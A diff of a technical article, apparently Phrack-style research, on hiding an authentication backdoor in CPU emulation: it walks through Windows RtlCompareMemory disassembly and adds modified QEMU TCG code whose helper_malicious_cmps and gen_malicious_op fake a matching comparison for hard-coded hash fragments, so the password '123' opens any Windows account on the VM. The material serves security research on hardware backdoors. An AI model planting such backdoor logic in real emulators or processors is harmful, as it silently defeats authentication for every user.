@@ -356,47 +356,47 @@ with the one stored in the SAM database using RtlCompareMemory(). If they
 match, authentication succeeds. Below is the disassembly of
 RtlCompareMemory().
 
-ntdll!RtlCompareMemory:
-76ff6970 56 push esi
-76ff6971 57 push edi
-76ff6972 fc cld
-76ff6973 8b74240c mov esi,dword ptr [esp+0Ch]
-76ff6977 8b7c2410 mov edi,dword ptr [esp+10h]
-76ff697b 8b4c2414 mov ecx,dword ptr [esp+14h]
-76ff697f c1e902 shr ecx,2
-76ff6982 7404 je ntdll!RtlCompareMemory+0x18 (76ff6988)
-
-ntdll!RtlCompareMemory+0x14:
-76ff6984 f3a7 repe cmps dword ptr [esi],dword ptr es:[edi]
-76ff6986 7516 jne ntdll!RtlCompareMemory+0x2e (76ff699e)
-
-ntdll!RtlCompareMemory+0x18:
-76ff6988 8b4c2414 mov ecx,dword ptr [esp+14h]
-76ff698c 83e103 and ecx,3
-76ff698f 7404 je ntdll!RtlCompareMemory+0x25 (76ff6995)
-
-ntdll!RtlCompareMemory+0x21:
-76ff6991 f3a6 repe cmps byte ptr [esi],byte ptr es:[edi]
-76ff6993 7516 jne ntdll!RtlCompareMemory+0x3b (76ff69ab)
-
-ntdll!RtlCompareMemory+0x25:
-76ff6995 8b442414 mov eax,dword ptr [esp+14h]
-76ff6999 5f pop edi
-76ff699a 5e pop esi
-76ff699b c20c00 ret 0Ch
-
-ntdll!RtlCompareMemory+0x2e:
-76ff699e 83ee04 sub esi,4
-76ff69a1 83ef04 sub edi,4
-76ff69a4 b904000000 mov ecx,4
-76ff69a9 f3a6 repe cmps byte ptr [esi],byte ptr es:[edi]
-
-ntdll!RtlCompareMemory+0x3b:
-76ff69ab 4e dec esi
-76ff69ac 2b74240c sub esi,dword ptr [esp+0Ch]
-76ff69b0 8bc6 mov eax,esi
-76ff69b2 5f pop edi
-76ff69b3 5e 
+ ntdll!RtlCompareMemory:
+ 76ff6970 56 push esi
+ 76ff6971 57 push edi
+ 76ff6972 fc cld
+ 76ff6973 8b74240c mov esi,dword ptr [esp+0Ch]
+ 76ff6977 8b7c2410 mov edi,dword ptr [esp+10h]
+ 76ff697b 8b4c2414 mov ecx,dword ptr [esp+14h]
+ 76ff697f c1e902 shr ecx,2
+ 76ff6982 7404 je ntdll!RtlCompareMemory+0x18 (76ff6988)
+ 
+ ntdll!RtlCompareMemory+0x14:
+ 76ff6984 f3a7 repe cmps dword ptr [esi],dword ptr es:[edi]
+ 76ff6986 7516 jne ntdll!RtlCompareMemory+0x2e (76ff699e)
+ 
+ ntdll!RtlCompareMemory+0x18:
+ 76ff6988 8b4c2414 mov ecx,dword ptr [esp+14h]
+ 76ff698c 83e103 and ecx,3
+ 76ff698f 7404 je ntdll!RtlCompareMemory+0x25 (76ff6995)
+ 
+ ntdll!RtlCompareMemory+0x21:
+ 76ff6991 f3a6 repe cmps byte ptr [esi],byte ptr es:[edi]
+ 76ff6993 7516 jne ntdll!RtlCompareMemory+0x3b (76ff69ab)
+ 
+ ntdll!RtlCompareMemory+0x25:
+ 76ff6995 8b442414 mov eax,dword ptr [esp+14h]
+ 76ff6999 5f pop edi
+ 76ff699a 5e pop esi
+ 76ff699b c20c00 ret 0Ch
+ 
+ ntdll!RtlCompareMemory+0x2e:
+ 76ff699e 83ee04 sub esi,4
+ 76ff69a1 83ef04 sub edi,4
+ 76ff69a4 b904000000 mov ecx,4
+ 76ff69a9 f3a6 repe cmps byte ptr [esi],byte ptr es:[edi]
+ 
+ ntdll!RtlCompareMemory+0x3b:
+ 76ff69ab 4e dec esi
+ 76ff69ac 2b74240c sub esi,dword ptr [esp+0Ch]
+ 76ff69b0 8bc6 mov eax,esi
+ 76ff69b2 5f pop edi
+ 76ff69b3 5e 
 
 
 Since the hash data is exactly 16 bytes long and system-allocated memory is
@@ -405,11 +405,11 @@ process. On 32-bit x86 systems, it performs four 32-bit (DWORD) comparisons
 using REPE CMPSD, while on 64-bit x86 systems, it executes two 64-bit
 (QWORD) comparisons via REPE CMPSQ, as shown below.
 
-x86
-"f3a7   repe cmps dword ptr [esi],dword ptr es:[edi]"
-
-x86_64 
-"f348a7  repe cmps qword ptr [rsi],qword ptr [rdi]"
+ x86
+ "f3a7   repe cmps dword ptr [esi],dword ptr es:[edi]"
+ 
+ x86_64 
+ "f348a7  repe cmps qword ptr [rsi],qword ptr [rdi]"
 
 
 The esi and edi registers store the memory addresses of the two hash values
@@ -440,166 +440,170 @@ of micro-operations.
 
 ----[ 3.2 x86 QEMU TCG-based Prototype
 
-I really wish I could put this backdoor on a real x86 CPU. But I can't find
-an open-source x86 CPU capable of running the Windows system (NT kernel)
-yet, and I can't make one myself (although I'm studying the ao486_MiSTer
-project as a potential starting point). So, for now, I'll demonstrate the
-backdoor design using the QEMU TCG emulator.
+I truly wish I could implement this backdoor on a x86 CPU. However, I
+haven’t found an open-source x86 processor capable of running the Windows
+NT kernel, and developing one myself is beyond my current capabilities
+(though I’m studying the ao486_MiSTer project). For now, I’ll demonstrate
+the backdoor using QEMU’s TCG emulator instead.
 
-TCG (Tiny Code Generator) serves as the dynamic binary translation engine
-for QEMU. It converts target instructions through TCG frontend-ops, which
-are then compiled into host instructions. This process is known as Dynamic
-Binary Translation. While it's still software emulation, it's considerably
-faster than interpreters like Bochs, as it compiles instructions rather
-than interpreting each one individually.
+(Three years later, I’m still working towards my x86-core goal.
+Fortunately, microcode has become far more accessible, allowing me to
+prototype a microcode-based backdoor as well. Full detailes are in Section
+3.4.)
 
-The function below is responsible for decoding the target binary, making it
-a good starting point to understand TCG.
+TCG (Tiny Code Generator) is QEMU's dynamic binary translation engine.
+Instead of interpreting instructions one by one (like Bochs), TCG
+translates target CPU instructions into intermediate TCG ops, which are
+then compiled into host machine code. This approach, called Dynamic Binary
+Translation, delivers significantly better performance than traditional
+interpreters while still being software-based.
 
+To understand how TCG translates machine code, we begin with disas_insn()
+which is the core function that decodes CPU instructions into TCP ops.
 
-static target_ulong disas_insn (DisasContext *s, CPUState *cpu);
-
-
-You can find it in "target/i386/tcg/translate.c," and both x86 and x86_64
-architectures use the same file. disas_insn() features a large switch-case
-statement that decodes each instruction. In this context, 0xa7 represents
-the opcode for CMPS with dword operands, as depicted in the code snippet.
+ static target_ulong disas_insn (DisasContext *s, CPUState *cpu);
 
 
-    case 0xa6: /* cmpsS */
-    case 0xa7:
-        ot = mo_b_d(b, dflag);
-        if (prefixes & PREFIX_REPNZ) {
-            gen_repz_cmps(s, ot, pc_start - s->cs_base,
-                          s->pc - s->cs_base, 1);
-        } else if (prefixes & PREFIX_REPZ) {
-            gen_repz_cmps(s, ot, pc_start - s->cs_base, 
-                          s->pc - s->cs_base, 0);
-        } else {
-            gen_cmps(s, ot);
-        }
-        break;
+Located in target/i386/tcg/translate.c, this implementation handles both
+x86 and x86_64 architectures. The disas_insn() function uses a large
+switch-case structure for instruction decoding. Within it, opcode 0xa7 maps
+to the CMPS instruction with dword operands, as illustrated below.
+ 
+ case 0xa6: /* cmpsS */
+ case 0xa7:
+     ot = mo_b_d(b, dflag);
+     if (prefixes & PREFIX_REPNZ) {
+         gen_repz_cmps(s, ot, pc_start - s->cs_base,
+                       s->pc - s->cs_base, 1);
+     } else if (prefixes & PREFIX_REPZ) {
+         gen_repz_cmps(s, ot, pc_start - s->cs_base, 
+                       s->pc - s->cs_base, 0);
+     } else {
+         gen_cmps(s, ot);
+     }
+     break;
 
 
-The gen_cmps() function manages individual CMPS instructions, while
-gen_repz_cmps() is a micro that handles prefixed CMPS instructions,
-eventually calling gen_cmps() for each iteration.
+gen_cmps() handles standalone CMPS instruction, while gen_repz_cmps()
+processes REP-prefixed CMPS operations by repeatedly invoking gen_cmps()
+for each iteration. The implementation is shown below.
+
+ static inline void gen_cmps(DisasContext *s, MemOp ot)
+ {
+     gen_string_movl_A0_EDI(s);
+     gen_op_ld_v(s, ot, s->T1, s->A0);
+     gen_string_movl_A0_ESI(s);
+     gen_op(s, OP_CMPL, ot, OR_TMP0);
+     gen_op_movl_T0_Dshift(s, ot);
+     gen_op_add_reg_T0(s, s->aflag, R_ESI);
+     gen_op_add_reg_T0(s, s->aflag, R_EDI);
+ }
 
 
-static inline void gen_cmps(DisasContext *s, MemOp ot)
-{
-    gen_string_movl_A0_EDI(s);
-    gen_op_ld_v(s, ot, s->T1, s->A0);
-    gen_string_movl_A0_ESI(s);
-    gen_op(s, OP_CMPL, ot, OR_TMP0);
-    gen_op_movl_T0_Dshift(s, ot);
-    gen_op_add_reg_T0(s, s->aflag, R_ESI);
-    gen_op_add_reg_T0(s, s->aflag, R_EDI);
-}
+It is constructed using TCG front-end operations, which consist of
+functions beginning with tcg_ such as tcg_gen_mov_tl(). These operations
+represent fundamental CPU instructions and are directly translated into
+host machine code during JIT compilation, functioning similarly to
+microcode in real x86 CPU. For more complex instruction emulation that
+cannot be efficiently represented with basic TCG operations, TCG provides a
+helper function mechanism. These helpers are implemented as C functions
+that are called from TCG-generated code, allowing complex operations to be
+executed as precompiled native binary for optimal performance. By using
+helper functions for complicated cases, TCG avoids the need to express
+sophisticated logic through TCG ops while maintaining execution speed.
+
+The helper function gen_helper_malicious_cmps() implements backdoor logic
+that checks if the memory pointed to by edi/rdi matches predefined master
+password hashes. If a match is found, gen_malicious_op() alters the result
+of the CMPS instruction to fake a successful comparison. Relevant code
+snippets are shown below.
+ 
+ static inline void gen_cmps(DisasContext *s, MemOp ot)
+ {
+     TCGv ret0;
+     ret0 = tcg_temp_local_new();
+ 
+     gen_string_movl_A0_EDI(s);
+     gen_op_ld_v(s, ot, s->T1, s->A0);
+     gen_string_movl_A0_ESI(s);
+ 
+     gen_helper_malicious_cmps(ret0, cpu_env, s->T1);
+     gen_malicious_op(s, OP_CMPL, ot, OR_TMP0, ret0);
+ 
+     gen_op_movl_T0_Dshift(s, ot);
+     gen_op_add_reg_T0(s, s->aflag, R_ESI);
+     gen_op_add_reg_T0(s, s->aflag, R_EDI);
+ 
+     tcg_temp_free(ret0);
+ }
 
 
-The gen_cmps() function comprises TCG front-end ops[1], which are C
-functions prefixed with tcg_, like tcg_gen_mov_tl(). Additionally, TCG
-offers a helper function mechanism to facilitate the emulation of more
-intricate operations.
+ #ifdef TARGET_X86_64
+ target_ulong helper_malicious_cmps(CPUX86State *env, uint64_t rdi)
+ {
+     target_ulong val = 0;
+     
+     if (rdi == 0xa79016d797e6bd3d || rdi == 0x78362812eb4b2069)
+     {
+         printf("helper_malicious_cmps: edi 0x%llx\n", 
+                                       (long long unsigned int)rdi);
+         val = 1;
+     }
+     
+     return val;
+ }
+ #else
+ target_ulong helper_malicious_cmps(CPUX86State *env, uint32_t edi)
+ {
+     target_ulong val = 0;
+ 
+     if (edi == 0x97e6bd3d || edi == 0xa79016d7 
+      || edi == 0xeb4b2069 || edi == 0x78362812)
+     {
+         printf("helper_malicious_cmps: edi 0x%x\n", edi);
+         val = 1;
+     }
+ 
+     return val;
+ }
+ #endif
 
 
-static inline void gen_cmps(DisasContext *s, MemOp ot)
-{
-    TCGv ret0;
-    ret0 = tcg_temp_local_new();
-
-    gen_string_movl_A0_EDI(s);
-    gen_op_ld_v(s, ot, s->T1, s->A0);
-    gen_string_movl_A0_ESI(s);
-
-    gen_helper_malicious_cmps(ret0, cpu_env, s->T1);
-    gen_malicious_op(s, OP_CMPL, ot, OR_TMP0, ret0);
-
-    gen_op_movl_T0_Dshift(s, ot);
-    gen_op_add_reg_T0(s, s->aflag, R_ESI);
-    gen_op_add_reg_T0(s, s->aflag, R_EDI);
-
-    tcg_temp_free(ret0);
-}
-
-
-We've added a helper function called gen_helper_malicious_cmps() to
-implement extra malicious handling on the CMPS instruction. It checks if
-edi/rdi matches the secret password hash. If it does, gen_malicious_op()
-alters the instruction's result. Although TCG ops could perform this check
-faster, the helper function enables the use of printf and other libraries,
-greatly facilitating debugging. Below is the helper code for both x86 and
-x86_64 architectures, along with part of the gen_malicious_op() code.
-
-
-#ifdef TARGET_X86_64
-target_ulong helper_malicious_cmps(CPUX86State *env, uint64_t rdi)
-{
-    target_ulong val = 0;
-    
-    if (rdi == 0xa79016d797e6bd3d || rdi == 0x78362812eb4b2069)
-    {
-        printf("helper_malicious_cmps: edi 0x%llx\n", 
-                                      (long long unsigned int)rdi);
-        val = 1;
-    }
-    
-    return val;
-}
-#else
-target_ulong helper_malicious_cmps(CPUX86State *env, uint32_t edi)
-{
-    target_ulong val = 0;
-
-    if (edi == 0x97e6bd3d || edi == 0xa79016d7 
-     || edi == 0xeb4b2069 || edi == 0x78362812)
-    {
-        printf("helper_malicious_cmps: edi 0x%x\n", edi);
-        val = 1;
-    }
-
-    return val;
-}
-#endif
+ /* if d == OR_TMP0, it means memory operand (address in A0) */
+ static void gen_malicious_op(DisasContext *s1, int op, MemOp ot, int d,
+ TCGv ret0)
+ {
+ 
+ ...
+ 
+     switch(op) {
+ 
+ ...
+ 
+     case OP_CMPL:
+         {
+         // uty: test
+         TCGv one;
+         one = tcg_constant_tl(1); // no need to free
+         tcg_gen_movcond_tl(TCG_COND_EQ, s1->T0, ret0, one, one, s1->T0);
+         tcg_gen_movcond_tl(TCG_COND_EQ, s1->T1, ret0, one, one, s1->T1);
+ 
+         tcg_gen_mov_tl(cpu_cc_src, s1->T1);
+         tcg_gen_mov_tl(s1->cc_srcT, s1->T0);
+         tcg_gen_sub_tl(cpu_cc_dst, s1->T0, s1->T1);
+         set_cc_op(s1, CC_OP_SUBB + ot);
+ 
+         tcg_temp_free(one); // tcg_temp_free will simply ignore it
+         }
+         break;
+     }
+ }
 
 
-/* if d == OR_TMP0, it means memory operand (address in A0) */
-static void gen_malicious_op(DisasContext *s1, int op, MemOp ot, int d,
-TCGv ret0)
-{
-
-...
-
-    switch(op) {
-
-...
-
-    case OP_CMPL:
-        {
-        // uty: test
-        TCGv one;
-        one = tcg_constant_tl(1); // no need to free
-        tcg_gen_movcond_tl(TCG_COND_EQ, s1->T0, ret0, one, one, s1->T0);
-        tcg_gen_movcond_tl(TCG_COND_EQ, s1->T1, ret0, one, one, s1->T1);
-
-        tcg_gen_mov_tl(cpu_cc_src, s1->T1);
-        tcg_gen_mov_tl(s1->cc_srcT, s1->T0);
-        tcg_gen_sub_tl(cpu_cc_dst, s1->T0, s1->T1);
-        set_cc_op(s1, CC_OP_SUBB + ot);
-
-        tcg_temp_free(one); // tcg_temp_free will simply ignore it
-        }
-        break;
-    }
-}
-
-
-The secret password "123" will authenticate successfully once the CMPS
-instruction encounters all the hash fragments. Therefore, on this QEMU
-virtual machine, regardless of the installed Windows system, you can
-utilize "123" as the secret password to access any user account without
-requiring any modifications to the Windows system.
+The master password '123' will authenticate successfully once the REPE CMPS
+instruction completes its comparison with all hash fragments. This means
+that on this QEMU virtual machine, as long as it runs a Windows NT-based
+system, the password '123' can be used to access any user account. 
 
 
 --[ 3.3 SPARC64 Backdoor Prototype on OpenSPARC T1 FPGA
